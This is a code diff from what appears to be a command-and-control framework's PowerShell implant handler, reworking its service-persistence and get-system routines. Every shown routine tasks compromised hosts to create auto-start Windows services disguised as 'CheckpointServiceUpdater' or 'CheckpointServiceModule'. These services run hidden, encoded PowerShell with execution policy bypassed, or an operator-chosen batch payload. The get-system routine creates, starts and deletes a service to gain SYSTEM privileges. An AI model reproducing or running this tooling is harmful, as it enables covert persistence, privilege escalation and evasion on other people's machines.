@@ -59,9 +59,6 @@ def handle_ps_command(command, user, randomuri, implant_id):
     elif command.startswith("download-files "):
         do_download_files(user, command, randomuri)
         return
-    elif command.startswith("install-servicelevel-persistencewithproxy"):
-        do_install_servicelevel_persistencewithproxy(user, command, randomuri)
-        return
     elif command.startswith("install-servicelevel-persistence"):
         do_install_servicelevel_persistence(user, command, randomuri)
         return
@@ -70,12 +67,6 @@ def handle_ps_command(command, user, randomuri, implant_id):
         return
     elif command.startswith("get-implantworkingdirectory"):
         do_get_implantworkingdirectory(user, command, randomuri)
-        return
-    elif command.startswith("get-system-withproxy"):
-        do_get_system_withproxy(user, command, randomuri)
-        return
-    elif command.startswith("get-system-withdaisy"):
-        do_get_system_withdaisy(user, command, randomuri)
         return
     elif command.startswith("get-system"):
         do_get_system(user, command, randomuri)
@@ -189,23 +180,20 @@ def do_download_files(user, command, randomuri):
     print_bad("Please enter a full path to the directory")
 
 
-def do_install_servicelevel_persistencewithproxy(user, command, randomuri):
-    C2 = get_c2server_all()
-    if C2.ProxyURL == "":
-        print_bad("Need to run createproxypayload first")
-        return
-    else:
-        newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, "%s?p" % get_newimplanturl(), PayloadsDirectory)
-        payload = newPayload.CreateRawBase()
-        cmd = "sc.exe create CPUpdater binpath= 'cmd /c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s' Displayname= CheckpointServiceUpdater start= auto" % (payload)
-        new_task(cmd, user, randomuri)
-
-
 def do_install_servicelevel_persistence(user, command, randomuri):
-    C2 = get_c2server_all()
-    newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, get_newimplanturl(), PayloadsDirectory)
-    payload = newPayload.CreateRawBase()
-    cmd = "sc.exe create CPUpdater binpath= 'cmd /c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s' Displayname= CheckpointServiceUpdater start= auto" % (payload)
+    style = Style.from_dict({
+        '': '#80d130',
+    })
+    session = PromptSession(history=FileHistory('%s/.payload-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
+    try:
+        path = session.prompt("Payload to use: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bat"))
+        path = PayloadsDirectory + path
+    except KeyboardInterrupt:
+        return
+    if os.path.isfile(path):
+        with open(path, "r") as p:
+            payload = p.read()        
+    cmd = "sc.exe create CPUpdater binpath= 'cmd /c %s' Displayname= CheckpointServiceUpdater start= auto" % (payload)
     new_task(cmd, user, randomuri)
 
 
@@ -217,26 +205,18 @@ def do_get_implantworkingdirectory(user, command, randomuri):
     new_task("pwd", user, randomuri)
 
 
-def do_get_system_withproxy(user, command, randomuri):
-    C2 = get_c2server_all()
-    if C2.ProxyURL == "":
-        print_bad("Need to run createproxypayload first")
+def do_get_system(user, command, randomuri):
+    style = Style.from_dict({
+        '': '#80d130',
+    })
+    session = PromptSession(history=FileHistory('%s/.payload-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
+    try:
+        path = session.prompt("Payload to use: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bat"))
+        path = PayloadsDirectory + path
+    except KeyboardInterrupt:
         return
-    else:
-        newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, "%s?p" % get_newimplanturl(), PayloadsDirectory)
-        payload = newPayload.CreateRawBase()
-        cmd = "sc.exe create CPUpdaterMisc binpath= 'cmd /c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s' Displayname= CheckpointServiceModule start= auto" % payload
-        new_task(cmd, user, randomuri)
-        cmd = "sc.exe start CPUpdaterMisc"
-        new_task(cmd, user, randomuri)
-        cmd = "sc.exe delete CPUpdaterMisc"
-        new_task(cmd, user, randomuri)
-
-
-def do_get_system_withdaisy(user, command, randomuri):
-    daisyname = input("Payload name required: ")
-    if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, daisyname))):
-        with open("%s%spayload.bat" % (PayloadsDirectory, daisyname), "r") as p:
+    if os.path.isfile(path):
+        with open(path, "r") as p:
             payload = p.read()
         cmd = "sc.exe create CPUpdaterMisc binpath= 'cmd /c %s' Displayname= CheckpointServiceModule start= auto" % payload
         new_task(cmd, user, randomuri)
@@ -244,18 +224,6 @@ def do_get_system_withdaisy(user, command, randomuri):
         new_task(cmd, user, randomuri)
         cmd = "sc.exe delete CPUpdaterMisc"
         new_task(cmd, user, randomuri)
-
-
-def do_get_system(user, command, randomuri):
-    C2 = get_c2server_all()
-    newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, get_newimplanturl(), PayloadsDirectory)
-    payload = newPayload.CreateRawBase()
-    cmd = "sc.exe create CPUpdaterMisc binpath= 'cmd /c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s' Displayname= CheckpointServiceModule start= auto" % payload
-    new_task(cmd, user, randomuri)
-    cmd = "sc.exe start CPUpdaterMisc"
-    new_task(cmd, user, randomuri)
-    cmd = "sc.exe delete CPUpdaterMisc"
-    new_task(cmd, user, randomuri)
 
 
 @creds()
